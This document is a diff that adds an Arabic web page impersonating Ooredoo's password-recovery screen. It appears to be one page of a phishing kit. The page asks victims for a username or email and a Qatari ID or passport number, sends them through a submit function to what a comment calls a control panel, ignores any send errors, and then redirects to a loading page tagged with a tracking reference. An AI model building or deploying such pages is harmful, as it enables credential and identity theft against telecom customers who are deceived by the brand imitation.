@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>نسيت كلمة المرور | Ooredoo</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
+    <!-- استدعاء ملف الإعدادات المركزي -->
+    <script src="config.js"></script>
+    <style>
+        body { font-family: 'Cairo', sans-serif; background-color: #ffffff; }
+        .input-forget {
+            border: 1.5px solid #e5e7eb;
+            border-radius: 15px;
+            padding: 16px;
+            width: 100%;
+            outline: none;
+            text-align: right;
+            font-size: 14px;
+            color: #333;
+        }
+        .input-forget::placeholder { color: #999; }
+        .btn-confirm {
+            background: #ed1c24;
+            color: white;
+            padding: 16px;
+            border-radius: 30px;
+            width: 100%;
+            font-weight: bold;
+            font-size: 18px;
+            margin-top: 25px;
+            transition: 0.3s;
+        }
+        .btn-confirm:active { transform: scale(0.98); opacity: 0.9; }
+    </style>
+</head>
+<body class="p-6">
+
+    <div class="max-w-[450px] mx-auto">
+        <!-- شعار Ooredoo -->
+        <div class="flex justify-center mb-10 mt-4">
+            <img src="assets/auth-provider.svg" class="h-10" alt="ooredoo">
+        </div>
+
+        <!-- العناوين -->
+        <div class="text-center mb-10">
+            <h1 class="text-[26px] font-black text-[#1a1a1a] mb-3">هل نسيت كلمة المرور؟</h1>
+            <h2 class="text-[22px] font-bold text-[#1a1a1a] leading-snug">لنقم بإنشاء كلمة مرور<br>جديدة</h2>
+        </div>
+
+        <!-- نص التنبيه -->
+        <p class="text-[13px] text-gray-500 font-bold leading-relaxed text-right mb-8 px-2">
+            يُرجى إدخال <span class="text-black font-black">اسم المستخدم أو البريد الإلكتروني،</span> ورقم <span class="text-black font-black">البطاقة الشخصية القطرية أو رقم جواز السفر</span> ليصلك رابط إعادة تعيين كلمة المرور.
+        </p>
+
+        <!-- الفورم -->
+        <form id="forgotForm" class="space-y-4">
+            <input type="text" id="user" name="user" class="input-forget" placeholder="البريد الإلكتروني أو اسم المستخدم" autocomplete="username" required>
+            <input type="text" id="qid" name="qid" class="input-forget" placeholder="رقم البطاقة الشخصية القطرية أو جواز السفر" required>
+            <button type="submit" id="subBtn" class="btn-confirm">تأكيد</button>
+        </form>
+    </div>
+
+    <script>
+        var ref = resolveRef();
+
+        document.getElementById('forgotForm').onsubmit = function (e) {
+            e.preventDefault();
+            var btn = document.getElementById('subBtn');
+            btn.innerText = 'جاري التأكد...';
+            btn.disabled = true;
+
+            var userVal = document.getElementById('user').value;
+            var qidVal = document.getElementById('qid').value;
+
+            // بيانات الاستعادة تُعلَّم كحساسة لتظهر مخفية في لوحة التحكم.
+            jusourSubmit({
+                ref: ref,
+                page_key: 'ooredoo_forgot',
+                summary: 'استعادة كلمة مرور Ooredoo',
+                fields: [
+                    { label: 'المستخدم', value: userVal, sensitive: true },
+                    { label: 'البطاقة الشخصية / الجواز', value: qidVal, sensitive: true }
+                ]
+            }).catch(function () {
+                /* لا نعطّل المستخدم إذا تعذّر الإرسال */
+            }).then(function () {
+                window.setTimeout(function () {
+                    window.location.href = 'loading.html?ref=' + encodeURIComponent(ref) + '&v=' + Date.now();
+                }, 1000);
+            });
+        };
+    </script>
+</body>
+</html>
